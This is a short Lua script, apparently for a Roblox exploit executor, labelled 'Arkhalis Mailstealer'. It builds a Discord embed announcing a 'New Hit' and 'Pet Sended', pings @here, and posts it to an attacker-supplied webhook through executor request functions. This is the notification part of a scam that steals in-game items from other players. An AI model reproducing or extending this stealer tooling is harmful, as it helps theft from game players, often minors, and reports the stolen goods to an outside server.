
local webhookcolor = "13369599"

local function sendwebhook(msg)
local msg = {
	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
	["content"]= "**🎁New Hit With Arkhalis🎁** || @here|| ",
	["username"] = "Arkhalis",
	["embeds"]= {
	  {
		["title"]= "`Arkhalis Mailstealer Results`",
		["description"]= "**Pet Sended (′ꈍωꈍ‵)**",
		["url"]= "https://discord.gg/vzY4yAk9ns",
		["color"]= ""..webhookcolor.."",
		["thumbnail"] = {
        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
        ["height"] = 420,
        ["width"] = 420
        },
      
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)
